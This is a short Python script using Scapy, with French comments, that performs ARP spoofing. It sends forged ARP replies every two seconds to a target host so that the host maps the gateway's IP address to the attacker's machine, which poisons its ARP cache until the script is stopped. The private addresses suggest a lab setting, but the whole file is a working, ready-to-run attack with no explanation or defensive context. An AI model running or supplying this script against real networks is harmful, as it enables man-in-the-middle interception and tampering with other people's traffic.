from scapy.all import *
import time

# Définition des paramètres
ip_cible = "10.1.1.253"   # Cible
ip_usurpee = "10.1.1.100"   # IP usurpée (passerelle)
mac_cible = "bc:24:11:06:53:52"    # MAC de la cible

# Spécification de l'interface réseau
interface = "ens18" 

# Création du paquet ARP Spoofing avec la couche Ethernet
packet = Ether(dst=mac_cible) / ARP(op=2, pdst=ip_cible, hwdst=mac_cible, psrc=ip_usurpee)

try:
    while True:
        sendp(packet, iface=interface, verbose=False)  # Envoi en précisant l'interface réseau
        time.sleep(2)  # Pause pour maintenir l'empoisonnement
except KeyboardInterrupt:
    print("\n[+] Stopping ARP Spoofing")
